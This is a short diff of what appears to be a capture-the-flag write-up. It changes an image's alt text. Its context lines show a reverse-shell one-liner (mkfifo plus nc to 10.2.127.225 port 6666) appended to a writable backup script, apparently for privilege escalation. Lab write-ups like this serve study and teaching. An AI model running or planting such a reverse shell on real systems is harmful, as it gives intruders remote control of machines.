@@ -133,7 +133,7 @@ You can write script: /usr/local/bin/main_backup.sh
 
 - ``echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.2.127.225 6666 >/tmp/f" >> /usr/local/bin/main_backup.sh``
 
-![](/assets/team01.png)
+![0xskar](/assets/team01.png)
 
 * * * 
 
